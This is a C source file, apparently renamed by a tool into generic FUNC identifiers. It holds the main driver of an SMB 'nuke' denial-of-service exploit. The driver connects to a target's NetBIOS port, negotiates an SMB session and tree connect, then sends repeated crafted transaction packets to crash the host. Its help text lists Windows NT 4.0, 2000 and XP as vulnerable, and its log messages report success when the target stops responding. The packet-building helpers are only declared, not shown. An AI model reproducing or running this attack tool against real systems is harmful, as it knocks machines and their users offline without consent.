#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {unsigned int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {scalar_t__ error_class; } ;
typedef  TYPE_1__ smb_header ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  buffer ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
#define  STATE_NEGOTIATING_PROTOCOL 131 
#define  STATE_REQUESTING_SESSION_SETUP 130 
#define  STATE_REQUESTING_SESSION_SETUP_ANDX 129 
 unsigned int STATE_REQUESTING_TRANSACTION ; 
#define  STATE_REQUESTING_TREE_CONNECT_ANDX 128 
 void* FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 char* FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC6 (int,char**,char*) ; 
 char* FUNC7 (unsigned char*,int,char*,unsigned short,unsigned int) ; 
 int /*<<< orphan*/  FUNC8 (unsigned char*,int) ; 
 char* optarg ; 
 int optind ; 
 int /*<<< orphan*/  FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int FUNC11 (int,unsigned char*,int) ; 
 int /*<<< orphan*/  FUNC12 (int,char*) ; 
 int /*<<< orphan*/  FUNC13 (unsigned char*,int) ; 
 int /*<<< orphan*/  FUNC14 (unsigned char*,int) ; 
 int /*<<< orphan*/  FUNC15 (unsigned char*,int,char*) ; 
 int /*<<< orphan*/  FUNC16 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int /*<<< orphan*/  FUNC17 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int FUNC18 (char*,unsigned short) ; 
 int /*<<< orphan*/  FUNC19 (int /*<<< orphan*/ *) ; 

int
FUNC20 (int argc, char **argv)
{
  int fd, r, i, c;
  unsigned char buffer[1024 * 4];       /* Enough. */
  char *hostname = NULL, *name = NULL;

  unsigned int showhelp = 0;

  unsigned int packets = 10;
  unsigned int state;

  unsigned int udp_timeout = 10;
  unsigned int tcp_timeout = 10;

  unsigned short netbios_ssn_port = 139;
  unsigned short netbios_ns_port = 137;

  fd_set rfds;
  struct timeval tv;

  FUNC17 (FUNC19 (NULL));

  FUNC9 ();

  while ((c = FUNC6 (argc, argv, "N:n:p:P:t:T:h")) != -1)
    {
      switch (c)
        {
        case 'N':
          name = optarg;
          break;
        case 'n':
          packets = FUNC2 (optarg);
          break;
        case 'p':
          netbios_ns_port = FUNC2 (optarg);
          break;
        case 'P':
          netbios_ssn_port = FUNC2 (optarg);
          break;
        case 't':
          udp_timeout = FUNC2 (optarg);
          break;
        case 'T':
          tcp_timeout = FUNC2 (optarg);
          break;
        case 'h':
        default:
          showhelp = 1;
          break;
        }
    }

  if (optind < argc)
	  hostname = argv[optind++];
  
  if (showhelp || hostname == NULL)
    {
      FUNC10 ("Usage: %s [options] hostname/ip...\n", argv[0]);
      FUNC10
        ("   -N [netbios-name]         Netbios Name (default: ask the remote host)\n");
      FUNC10
        ("   -n [packets]              Number of crafted packets to send (default: %d)\n",
         packets);
      FUNC10
        ("   -p [netbios-ns port]      UDP Port to query (default: %d)\n",
         netbios_ns_port);
      FUNC10
        ("   -P [netbios-ssn port]     TCP Port to query (default: %d)\n",
         netbios_ssn_port);
      FUNC10
        ("   -t [udp-timeout]          Timeout to wait for receive on UDP ports (default: %d)\n",
         udp_timeout);
      FUNC10
        ("   -T [tcp-timeout]          Timeout to wait for receive on TCP ports (default: %d\n",
         tcp_timeout);
      FUNC10 ("\n");
      FUNC10 ("Known vulnerable systems: \n");
      FUNC10 ("    - Windows NT 4.0 Workstation/Server\n");
      FUNC10 ("    - Windows 2000 Professional/Advanced Server\n");
      FUNC10 ("    - Windows XP Professional/Home edition\n\n");
      FUNC3 (1);
    }

  if (!name
      && (name =
          FUNC7 (buffer, sizeof (buffer), hostname,
                              netbios_ns_port, udp_timeout)) == NULL)
    FUNC3 (1);
  else
    name = FUNC4 (name);

  FUNC10 ("Using netbios name: %s\n", name);

  FUNC10 ("Connecting to remote host (%s:%d)...\n", hostname,
          netbios_ssn_port);

  fd = FUNC18 (hostname, netbios_ssn_port);

  if (fd == -1)
    FUNC3 (1);


  FUNC1 (&rfds);
  FUNC0 (fd, &rfds);

  tv.tv_sec = tcp_timeout;
  tv.tv_usec = 0;

  state = STATE_REQUESTING_SESSION_SETUP;

  FUNC12 (fd, name);

  for (;;)
    {
      if (!FUNC16 (fd + 1, &rfds, NULL, NULL, &tv))
        {
          if (state == STATE_REQUESTING_TRANSACTION)
            {
              FUNC5 (stderr,
                       "Timeout during TCP read - Seems like the remote host has crashed\n");
              return 0;
            }
          else
            {
              FUNC5 (stderr,
                       "Nuke failed (tcp timeout) at state %#02x, exiting...\n",
                       state);
              return 1;
            }
        }

      r = FUNC11 (fd, buffer, sizeof (buffer));

      if (r == 0)
        {
          FUNC10
            ("Nuke failed at state %#02x (EOF, wrong netbios name ?), exiting...\n",
             state);
          FUNC3 (1);
        }

      if (((smb_header *) (buffer + 4))->error_class != 0)
        {
          FUNC5 (stderr, "Nuke failed at state %#02x, exiting...\n", state);
          FUNC3 (1);
        }

      switch (state)
        {
        case STATE_REQUESTING_SESSION_SETUP:
          FUNC10 ("Negotiating protocol...\n");
          FUNC8 (buffer, fd);
          break;
        case STATE_NEGOTIATING_PROTOCOL:
          FUNC10 ("Requesting session setup (AndX)\n");
          FUNC13 (buffer, fd);
          break;
        case STATE_REQUESTING_SESSION_SETUP_ANDX:
          FUNC10 ("Requesting tree connect (AndX)\n");
          FUNC15 (buffer, fd, name);
          break;
        case STATE_REQUESTING_TREE_CONNECT_ANDX:
          for (i = 0; i < packets; i++)
            {
              FUNC10 ("Requesting transaction (nuking) #%d\n", i + 1);
              FUNC14 (buffer, fd);
            }
	    FUNC10 ("Wait...\n");
          break;
        default:
          FUNC10 ("Seems like the nuke failed :/ (patched ?)\n");
	  FUNC3 (1);
        }

      state++;
    }

  return 0;
}